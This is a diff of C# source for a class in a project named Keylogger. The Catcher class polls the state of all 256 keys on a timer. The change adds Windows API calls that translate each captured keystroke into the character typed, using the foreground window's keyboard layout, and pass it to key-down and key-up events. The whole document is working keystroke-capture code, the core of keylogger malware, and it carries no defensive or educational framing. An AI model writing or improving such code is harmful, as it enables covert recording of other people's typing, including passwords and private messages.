@@ -13,37 +13,47 @@ namespace Keylogger
     class Catcher
     {
         [DllImport("user32.dll")]
-        public static extern int GetAsyncKeyState(int key);
-
+        static extern int GetAsyncKeyState(int key);
         [DllImport("user32.dll")]
-        public static extern int ToUnicode(
-            uint virtualKeyCode,
+        static extern int ToUnicodeEx(uint virtualKeyCode,
             uint scanCode,
             byte[] keyboardState,
+            [Out, MarshalAs(UnmanagedType.LPWStr, SizeConst = 64)]
             StringBuilder receivingBuffer,
             int bufferSize,
-            uint flags);
+            uint flags,
+            IntPtr layout);
 
+        [DllImport("user32.dll")]
+        static extern IntPtr GetKeyboardLayout(int thread);
+
+        [DllImport("user32.dll")]
+        static extern IntPtr GetForegroundWindow();
+
+        [DllImport("user32.dll")]
+        static extern uint GetWindowThreadProcessId(IntPtr hwnd, IntPtr proccess);
 
         System.Timers.Timer timer;
         int delay;
+        Thread mainThread;
         public int Delay { get => delay; set => ChangeDelay(value); }
         public bool IsActive { get => timer.Enabled; }
 
-        public delegate void KeyHandler(Keys key);
+        public delegate void KeyHandler(Keys key, string s);
         public event KeyHandler KeyDown;
         public event KeyHandler KeyUp;
-        Dictionary<int, bool> prevStatus;
-        public Catcher(int delay)
+        Dictionary<Keys, bool> prevStatus;
+        public Catcher(int delay, Thread mainThread)
         {
-            prevStatus = new Dictionary<int, bool>();
+            prevStatus = new Dictionary<Keys, bool>();
             for (int i = 0; i < 256; i++)
             {
-                prevStatus.Add(i, false);
+                prevStatus.Add((Keys)i, false);
             }
             timer = new System.Timers.Timer(delay);
             Delay = delay;
             timer.Elapsed += CheckKeys;
+            this.mainThread = mainThread;
         }
         public void Start()
         {
@@ -60,20 +70,33 @@ namespace Keylogger
         }
         public void CheckKeys(Object source, ElapsedEventArgs e)
         {
+            IntPtr foregroundWindow = GetForegroundWindow();
             for (int i = 0; i < 256; i++)
             {
                 int responce = GetAsyncKeyState(i);
+                Keys key = (Keys)i;
                 if (responce == 32769)
                 {
-                    prevStatus[i] = true;
-                    KeyDown((Keys)i);
+                    prevStatus[key] = true;
+                    KeyDown((Keys)i, KeyToString(i, foregroundWindow));
                 }
-                else if(responce == 0 && prevStatus[i])
+                else if(responce == 0 && prevStatus[key])
                 {
-                    prevStatus[i] = false;
-                    KeyUp((Keys)i);
+                    prevStatus[key] = false;
+                    KeyUp((Keys)i, KeyToString(i, foregroundWindow));
                 }
             }
         }
+
+        string KeyToString(int key, IntPtr window)
+        {
+            int foregroundWindow = (int)GetWindowThreadProcessId(window, IntPtr.Zero);
+            StringBuilder sb = new StringBuilder(256);
+            byte[] state = new byte[256];
+            ToUnicodeEx((uint)key, 0, state, sb, 256, 0, GetKeyboardLayout(foregroundWindow));
+            return sb.ToString();
+        }
+
+
     }
 }
